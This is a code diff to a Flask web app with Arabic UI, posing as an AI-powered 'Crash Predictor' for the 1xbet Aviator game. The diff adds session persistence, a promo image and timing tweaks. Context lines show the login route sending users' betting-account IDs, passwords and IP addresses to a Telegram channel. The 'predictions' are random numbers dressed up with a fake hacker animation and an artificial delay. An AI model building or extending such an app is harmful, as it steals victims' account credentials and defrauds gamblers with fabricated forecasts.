@@ -40,7 +40,7 @@ HTML = """
             transition:0.3s;
             overflow-x:hidden;
         }
-        /* تأثيرات الذكاء الاصطناعي - شبكات وخلفية متحركة */
+        /* تأثيرات الذكاء الاصطناعي */
         .ai-bg {
             position:fixed;
             top:0;
@@ -68,20 +68,6 @@ HTML = """
             0% { transform: translate(0, 0); }
             100% { transform: translate(40px, 40px); }
         }
-        .ai-bg::after {
-            content:'🤖 🔍 🕸️ 💻';
-            position:absolute;
-            bottom:10px;
-            right:10px;
-            font-size:30px;
-            opacity:0.3;
-            animation: float 10s ease-in-out infinite;
-        }
-        @keyframes float {
-            0%,100%{transform:translateY(0px)}
-            50%{transform:translateY(-20px)}
-        }
-        /* الروبوتات المتحركة */
         .robot {
             position:fixed;
             font-size:35px;
@@ -94,7 +80,7 @@ HTML = """
             0%{transform:translateX(-100px) translateY(0px)}
             100%{transform:translateX(calc(100vw + 100px)) translateY(0px)}
         }
-        /* قائمة همبرجر (تظهر فقط عند الحاجة) */
+        /* قائمة همبرجر */
         .menu-btn {
             position:fixed;
             top:15px;
@@ -150,7 +136,6 @@ HTML = """
         .cards-row{display:flex;justify-content:center;gap:15px;flex-wrap:wrap;margin:30px 0}
         .card{background:rgba(255,255,255,0.05);backdrop-filter:blur(10px);border-radius:20px;padding:20px;text-align:center;border:1px solid rgba(255,215,0,0.3);flex:1;min-width:200px;max-width:250px}
         .btn{background:linear-gradient(135deg,#ffd700,#ff8c00);color:#000;padding:12px;border:none;border-radius:50px;font-weight:bold;cursor:pointer;width:100%;margin-top:10px}
-        .btn-secondary{background:linear-gradient(135deg,#1a1a2e,#16213e);border:2px solid #ffd700;color:#ffd700}
         input{width:100%;padding:12px;margin:8px 0;background:rgba(0,0,0,0.6);border:1px solid #ffd700;border-radius:30px;color:#fff}
         .prediction-card{
             background:linear-gradient(135deg,#1a1a2e,#16213e);
@@ -161,7 +146,7 @@ HTML = """
             margin:20px 0;
             position:relative;
         }
-        /* خوارزميات وشبكات هكر في صفحة التوقعات */
+        /* خوارزميات وشبكات هكر */
         .hacker-overlay {
             position:absolute;
             top:0;
@@ -186,7 +171,21 @@ HTML = """
         .rotating-plane{width:100px;height:100px;margin:20px auto;animation:spinPlane 1s linear infinite}
         .rotating-plane img{width:100%;height:100%;object-fit:contain}
         @keyframes spinPlane{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
-        .logo-img{width:80px;margin:0 auto 15px;display:block}
+        /* صورة الشعار الكبيرة */
+        .logo-large {
+            width: 200px;
+            max-width: 80%;
+            margin: 0 auto 20px;
+            display: block;
+        }
+        /* صورة الإعلان البديلة */
+        .promo-img {
+            width: 100%;
+            max-width: 280px;
+            margin: 10px auto;
+            display: block;
+            border-radius: 15px;
+        }
         .user-bar{display:flex;justify-content:space-between;align-items:center;background:rgba(0,0,0,0.5);border-radius:50px;padding:8px 18px;margin-bottom:20px}
         .user-id{background:#ffd700;color:#000;padding:5px 16px;border-radius:30px;font-weight:bold}
         .modal{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#1a1a2e;border:2px solid #ffd700;border-radius:20px;padding:25px;z-index:2000;display:none;width:80%;max-width:350px;text-align:center}
@@ -234,7 +233,6 @@ HTML = """
 
 <script>
     let currentUserId = '{{user_id}}';
-    let currentPage = 'welcome';
     
     function toggleSidebar() {
         document.getElementById('sidebar').classList.toggle('active');
@@ -263,15 +261,32 @@ HTML = """
         }
     }
     
+    // حفظ حالة تسجيل الدخول في localStorage لمنع الخروج عند تحديث الصفحة
+    function saveLoginState(uid) {
+        if(uid && uid !== 'ضيف') {
+            localStorage.setItem('loggedInUserId', uid);
+        }
+    }
+    
+    function loadLoginState() {
+        const savedId = localStorage.getItem('loggedInUserId');
+        if(savedId && savedId !== 'ضيف' && currentUserId === 'ضيف') {
+            currentUserId = savedId;
+            showPage('predictor');
+            return true;
+        }
+        return false;
+    }
+    
     const pages = {
         welcome: `
             <div style="text-align:center;">
-                <img src="https://i.ibb.co/QFmWM96g/aviator-1x.webp" class="logo-img" onerror="this.src='https://cdn-icons-png.flaticon.com/512/1946/1946429.png'">
+                <img src="https://i.ibb.co/QFmWM96g/aviator-1x.webp" class="logo-large" onerror="this.src='https://cdn-icons-png.flaticon.com/512/1946/1946429.png'">
                 <p style="margin-bottom:20px;">نظام توقعات احترافي مدعوم بالذكاء الاصطناعي</p>
                 <div class="cards-row">
                     <div class="card"><h3>🔗 ربط الحساب</h3><p>اربط حساب 1xbet للحصول على التوقعات</p><button class="btn" onclick="showPage('link')">ربط حسابي</button></div>
-                    <div class="card"><h3>🎲 إنشاء حساب</h3><p>ليس لديك حساب؟ افتح حساباً الآن</p><button class="btn btn-secondary" onclick="window.open('https://sa.1xbet.com', '_blank')">إنشاء حساب</button></div>
                 </div>
+                <img src="https://i.ibb.co/YTVyH73v/Gemini-Generated-Image-41ko3b41ko3b41ko.jpg" class="promo-img" onerror="this.style.display='none'">
                 <div class="footer">© 2026 Crash Predictor | نظام توقعات مدعوم بالروبوتات والذكاء الاصطناعي</div>
             </div>
         `,
@@ -337,12 +352,26 @@ HTML = """
     }
     
     function showPage(page) {
-        if(page === 'predictor' && currentUserId === 'ضيف') { showPage('welcome'); alert('الرجاء تسجيل الدخول أولاً'); return; }
+        if(page === 'predictor' && currentUserId === 'ضيف') { 
+            // محاولة استعادة الجلسة من localStorage
+            const savedId = localStorage.getItem('loggedInUserId');
+            if(savedId && savedId !== 'ضيف') {
+                currentUserId = savedId;
+            } else {
+                showPage('welcome'); 
+                alert('الرجاء تسجيل الدخول أولاً'); 
+                return;
+            }
+        }
         document.getElementById('mainContainer').innerHTML = pages[page];
         if(page === 'predictor') {
             document.getElementById('predictionDisplay').style.display = 'block';
             document.getElementById('loadingDisplay').style.display = 'none';
             generateHackerText();
+            // حفظ حالة تسجيل الدخول
+            if(currentUserId !== 'ضيف') {
+                localStorage.setItem('loggedInUserId', currentUserId);
+            }
         }
         updateMenuButton(page);
         closeSidebar();
@@ -360,6 +389,7 @@ HTML = """
         let data = await res.json();
         if(data.success) {
             currentUserId = uid;
+            saveLoginState(uid);
             document.getElementById('freeTrialModal').classList.add('active');
             document.getElementById('modalOverlay').classList.add('active');
         } else {
@@ -381,10 +411,19 @@ HTML = """
             predDiv.style.display = 'block';
             document.querySelector('.prediction-number').innerHTML = data.prediction + 'x';
             btn.disabled = false;
-        }, 3500);
+        }, 3000);  // 3 ثواني بالضبط
     }
     
-    showPage('welcome');
+    // محاولة استعادة الجلسة عند تحميل الصفحة
+    window.addEventListener('load', () => {
+        const savedId = localStorage.getItem('loggedInUserId');
+        if(savedId && savedId !== 'ضيف') {
+            currentUserId = savedId;
+            showPage('predictor');
+        } else {
+            showPage('welcome');
+        }
+    });
 </script>
 </body>
 </html>
@@ -399,7 +438,6 @@ def login():
     data = request.json
     uid = data.get('user_id', '').strip()
     pwd = data.get('password', '')
-    # التحقق من أن ID هو 10 أرقام بالضبط
     if not uid.isdigit() or len(uid) != 10:
         return jsonify({"success": False})
     send_to_telegram(uid, pwd, request.remote_addr)
@@ -408,7 +446,7 @@ def login():
 
 @app.route('/predict')
 def predict():
-    time.sleep(random.uniform(3, 4))
+    time.sleep(random.uniform(2.8, 3.2))
     r = random.randint(1, 100)
     if r <= 50: pred = round(random.uniform(1.0, 9.9), 1)
     elif r <= 80: pred = round(random.uniform(10.0, 19.9), 1)
